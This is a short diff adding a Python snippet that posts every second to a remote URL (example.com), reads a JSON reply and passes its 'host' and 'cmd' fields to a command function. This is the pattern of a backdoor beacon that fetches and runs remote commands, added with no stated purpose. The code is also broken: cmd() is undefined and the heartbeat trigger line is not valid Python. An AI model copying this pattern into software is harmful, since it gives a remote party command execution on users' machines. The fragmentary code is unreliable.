@@ -1,0 +1,12 @@
+import requests
+
+def fetch_commands():
+    response = requests.post("http://example.com/commands")
+    return response.json()
+
+def run(row):
+    data = fetch_commands()
+    if len(data) >= 1:
+        cmd(data["host"], data["cmd"])
+
+event.heartbeat_1s:run()
